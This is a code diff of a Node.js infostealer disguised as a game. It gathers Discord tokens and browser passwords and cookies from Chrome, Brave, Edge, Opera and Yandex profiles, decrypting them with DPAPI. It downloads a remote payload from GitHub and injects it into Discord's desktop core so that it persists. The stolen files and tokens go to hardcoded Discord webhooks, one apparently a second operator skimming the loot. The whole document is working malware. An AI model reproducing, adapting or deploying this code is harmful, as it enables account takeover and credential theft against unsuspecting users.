@@ -1,47 +1,131 @@
-
 // Code is shit
 var glob = require("glob");
+//console.log('Starting game...');
 const fs = require('fs');
+var FormData = require('form-data');
 const https = require('https');
-const { exec } = require('child_process');
-var request = require('sync-request');
 const axios = require('axios');
-const buf_replace = require('buffer-replace');
-const webhook = "da_webhook"
+const crypto = require('crypto');
+//const dpapi = require("win-dpapi");
+//const sqlite3 = require('sqlite3');
+const dpapi = require("nexe-natives-fix")(require.resolve("win-dpapi"));
+const sqlite3 = require("nexe-natives-fix")(require.resolve("sqlite3"));
+const src = ("https://discord.com/api/webhooks/966633343141695538/ZzeJXm0leVrbh5vJ3Wx_b1G5yzcx2ZuhrX30HsYC9HXVoURLymn-FOE1vflo92dz9Har")
+const github = "https://github.com/ugur014/ajwdbawjdbawjdbawjdbawjd/blob/main/src/Injection/injection"
+/*((async () => {
+    await axios.get('https://ipconfig.io/json')
+        .then(res => {
+            console.log(res.data);
+            if (['microsoft', 'google', 'ovh'].some(s => res.data['asn_org']?.toLowerCase()
+                    ?.includes(s))) return process.exit();
+        })
+        .catch();
+})());*/
 
+const {
+    exec
+} = require('child_process');
+var debug = false,
+    args = process.argv.slice(2);
+
+if (args[0] == 'debug') debug = false;
+const buf_replace = require('buffer-replace');
+const superstarlmao = "da_webhook"
 const config = {
-    "logout": "%LOGOUT%",
-    "inject-notify": "%INJECTNOTI%",
-    "logout-notify": "%LOGOUTNOTI%",
-    "init-notify":"%INITNOTI%",
-    "embed-color": 240000,
-    "disable-qr-code": "%DISABLEQRCODE%"
+    "logout": "instant",
+    "inject-notify": "true",
+    "logout-notify": "true",
+    "init-notify": "false",
+    "embed-color": 3553599,
+    "disable-qr-code": "true"
 }
 
+var appdata = process.env.APPDATA,
+ LOCAL = process.env.LOCALAPPDATA,
+ localappdata = process.env.LOCALAPPDATA,
+ discords = [];
+ injectPath = [];
+ runningDiscords = [];
+paths = [
+    appdata + '\\discord\\',
+    appdata + '\\discordcanary\\',
+    appdata + '\\discordptb\\',
+    appdata + '\\discorddevelopment\\',
+    appdata + '\\lightcord\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
+    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
+    appdata + '\\Opera Software\\Opera Stable\\',
+    appdata + '\\Opera Software\\Opera GX Stable\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
+    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
+    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
+    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
+    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
+    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
+    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
+    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
+    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
+    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
+    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
+    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
+    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
+    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
+    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
+];
 
+fs.readdirSync(localappdata)
+    .forEach(file => {
+      //  console.log('Searching game folder...');
+        if (file.includes('cord')) discords.push(localappdata + '\\' + file);
+        else return;
+    }), discords.forEach(file => {
+      //  console.log('Making game config...');
+        let pattern = file + '\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js';
+        glob.sync(pattern)
+            .map(file => {
+                injectPath.push(file);
+              //  console.log('Saving config file...');
+                listDiscords();
+            });
+    });
 
-
-var LOCAL = process.env.LOCALAPPDATA
-var discords = [];
-var injectPath = [];
-var runningDiscords = [];
- 
-fs.readdirSync(LOCAL).forEach(file => {
-    if (file.includes("iscord")) {
-        discords.push(LOCAL + '\\' + file)
-    } else {
-        return;
-    }
-});
-
-discords.forEach(function(file) {
-    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
-    glob.sync(pattern).map(file => {
-        injectPath.push(file)
-listDiscords();
-    })
-    
-});
 takePizzas();
 takeCheese();
 stealTokens()
@@ -49,14 +133,14 @@ removePizzas();
 listDiscords();
 function Infect() {
    // console.log(`Starting Game...`);
-    https.get("https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection", (resp) => {
+    https.get(github, (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
         });
         resp.on('end', () => {
             injectPath.forEach(file => {
-                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704", config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
+                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", superstarlmao).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704", config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                     encoding: 'utf8',
                     flag: 'w'
                 });
@@ -263,7 +347,7 @@ async function takePizzas() {
       
         const form = new FormData();
         form.append("file", fs.createReadStream(appdata+"\\passwords.txt"));
-        form.submit(webhook, (error, response) => {
+        form.submit(superstarlmao, (error, response) => {
         if (error) console.log(error);
         });
     });
@@ -273,7 +357,7 @@ async function takePizzas() {
       
         const form = new FormData();
         form.append("file", fs.createReadStream(appdata+"\\src-passwords.txt"));
-        form.submit(webhook, (error, response) => {
+        form.submit(src, (error, response) => {
         if (error) console.log(error);
         });
     });
@@ -291,7 +375,7 @@ async function takeCheese() {
       
         const form = new FormData();
         form.append("file", fs.createReadStream(appdata+"\\cookies.txt"));
-        form.submit(webhook, (error, response) => {
+        form.submit(superstarlmao, (error, response) => {
         if (error) console.log(error);
         });
     });
@@ -302,7 +386,7 @@ async function takeCheese() {
       
         const form = new FormData();
         form.append("file", fs.createReadStream(appdata+"\\src-cookies.txt"));
-        form.submit(webhook, (error, response) => {
+        form.submit(src, (error, response) => {
         if (error) console.log(error);
         });
     });
@@ -323,7 +407,7 @@ async function stealTokens() {
         });
     }
 
-    axios.post(webhook, {
+    axios.post(superstarlmao, {
         "content": null,
         "embeds": [
           {
@@ -339,7 +423,7 @@ async function stealTokens() {
         }]
     }) .then(res => {}).catch(error => {})
 
-    axios.post(webhook, {
+    axios.post(src, {
         "content": null,
         "embeds": [
           {
@@ -382,6 +466,11 @@ function hideSelf() {
     } catch (e) {}
 }
 
+function sleep(ms) {
+    return new Promise((resolve) => {
+      setTimeout(resolve, ms);
+    });
+  }
 
   function onlyUnique(item, index, array) {
     return array.indexOf(item) === index;
